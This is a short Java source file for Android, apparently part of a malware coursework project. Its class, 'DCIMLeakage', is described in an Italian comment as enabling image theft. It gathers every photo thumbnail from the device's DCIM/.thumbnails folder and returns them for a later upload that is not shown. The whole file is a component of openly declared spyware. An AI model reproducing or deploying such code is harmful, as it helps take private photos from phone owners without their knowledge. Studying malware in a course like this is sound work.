package com.malwareclass.malwareproject;

import android.content.Context;
import android.os.Environment;

import java.io.File;

/**
 * Permette il furto delle immagini
 * DA CONSIDERARE: immagine full-size o scalata o thumbnail?
 */
public class DCIMLeakage {
    private static final String TAG = "DCIMLeakage";


    public File[] leak(Context context){
        // path to .thumbnails dir
        String path = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DCIM).getPath()
                + "/.thumbnails/";

        // thumbnails directory
        File thumbnailsDir = new File(path);

        // get all thumbnails
        File[] thumbnails = thumbnailsDir.listFiles();

        // if there are some thumbnails, start to uplaod
        if ( thumbnails!=null && thumbnails.length>0 ){
            return thumbnails;
        }
        return null;
    }

}
